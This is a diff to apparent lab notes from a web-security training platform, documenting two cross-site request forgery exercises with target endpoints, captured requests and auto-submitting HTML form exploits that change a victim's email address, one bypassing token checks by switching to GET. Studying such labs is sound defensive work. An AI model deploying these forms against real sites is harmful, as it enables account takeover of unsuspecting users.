@@ -5,6 +5,7 @@ CSRF vulnerability with no defenses
 
 // target endpoint:
 POST /my-account/change-email
+email=<email>
 
 // exploit template:
 <form method="POST" action="https://0ade003203ba51e582c6fcec00a70021.web-security-academy.net/my-account/change-email">
@@ -14,4 +15,28 @@ POST /my-account/change-email
 <script>
   document.forms[0].submit();
 </script>
+
+===
+
+CSRF where token validation depends on request method
+
+// target endpoint:
+POST /my-account/change-email HTTP/2
+email=test1%40vendor1.test&csrf=lft4aa7bYzBpejN5phsmU2v65M1eyzWB
+
+// changing the csrf value gives a bad request response (400)
+email=test1%40vendor1.test&csrf=lft4aa7bYzBpejN5phsmU2v65M1eyzWB5
+
+// changing the request method to get bypasses the csrf validation:
+GET /my-account/change-email?email=test1%40vendor1.test&csrf=lft4aa7bYzBpejN5phsmU2v65M1eyzWB5 HTTP/2
+
+// exploit template:
+<form method="GET" action="https://0ade003203ba51e582c6fcec00a70021.web-security-academy.net/my-account/change-email">
+  <input type="hidden" name="email" value="newemail@attacker.test">
+  <input type="submit" value="Submit">
+</form>
+<script>
+  document.forms[0].submit();
+</script>
+
 
